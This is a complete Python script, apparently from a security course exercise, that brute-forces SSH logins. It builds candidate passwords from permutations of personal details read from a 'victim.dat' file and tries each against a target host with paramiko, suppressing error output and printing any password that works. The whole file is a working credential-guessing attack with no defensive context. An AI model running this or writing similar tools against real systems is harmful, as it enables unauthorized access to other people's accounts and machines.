#!/usr/bin/python3
import itertools
import paramiko
import sys
import os

username = "csc2024"
max_retries = 5

null = open(os.devnull, "w")
sys.stderr = null

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
file = open("victim.dat", "r")
info = [i.strip() for i in file.readlines()]
found_passwd = False

for n in range(2, 3): #1, len(info)+1 #############
    for i in itertools.permutations(info, n):
        str = ""
        for j in i:
            str += j
        
        for j in range(max_retries):
            try:
                client.connect(hostname=sys.argv[1], username=username, password=str, timeout=0.15)
                found_passwd = True
                print(f"Found: {str}")######
                break
            except KeyboardInterrupt:
                exit()
            except:
                continue

        if found_passwd:
            break
        else:
            print(f"Wrong Password: {str}")####
    if found_passwd:
        break

client.close()
file.close()